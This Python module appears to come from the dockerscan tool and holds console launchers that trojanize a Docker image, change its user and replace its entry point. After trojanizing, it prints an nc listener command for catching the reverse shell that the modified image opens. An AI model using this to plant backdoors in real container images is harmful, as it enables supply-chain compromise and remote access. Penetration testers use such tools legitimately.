import os
import logging

from dockerscan import get_log_level, run_in_console

from .api import *
from .model import *

log = logging.getLogger('dockerscan')


def launch_dockerscan_image_modify_trojanize_in_console(
        config: DockerImageInfoModifyTrojanizeModel):
    """Launch in console mode"""

    log.setLevel(get_log_level(config.verbosity))

    with run_in_console(config.debug):

        log.console("Starting analyzing docker image...")
        log.console("Selected image: '{}'".format(
            os.path.basename(config.image_path)))

        run_image_modify_trojanize_dockerscan(config)

        log.console("Image trojanized successfully")
        log.console("Trojanized image location:")
        log.console("  > {}".format(
            "{}.tar".format(os.path.abspath(config.output_image))
            if config.output_image else
            "{}.tar".format(
                os.path.abspath(os.path.basename(config.image_path)))
        ))
        log.console("To receive the reverse shell, only write:")
        log.console("  > nc -v -k -l {} {}".format(
            config.remote_addr,
            config.remote_port
        ))


def launch_dockerscan_image_modify_user_in_console(
        config: DockerImageInfoModifyUserModel):
    """Launch in console mode"""

    log.setLevel(get_log_level(config.verbosity))

    with run_in_console(config.debug):

        log.console("Starting analyzing docker image...")
        log.console("Selected image: '{}'".format(
            os.path.basename(config.image_path)))
        log.console("Updating to the new user: '{}'".format(
            os.path.basename(config.new_user)))

        run_image_modify_user_dockerscan(config)

        log.console("User updated successful")


def launch_dockerscan_image_modify_entrypoint_in_console(
        config: DockerImageInfoModifyEntryPointModel):
    """Launch in console mode"""

    log.setLevel(get_log_level(config.verbosity))

    with run_in_console(config.debug):

        log.console("Starting analyzing docker image...")
        log.console("Selected image: '{}'".format(
            os.path.basename(config.image_path)))
        log.console("Updating to the new entry-point: '{}'".format(
            os.path.basename(config.new_entry_point)))

        run_image_modify_entry_point_dockerscan(config)

        log.console("Entry-point updated successful")


__all__ = ("launch_dockerscan_image_modify_trojanize_in_console",
           "launch_dockerscan_image_modify_user_in_console",
           "run_image_modify_entry_point_dockerscan",
           "launch_dockerscan_image_modify_entrypoint_in_console")
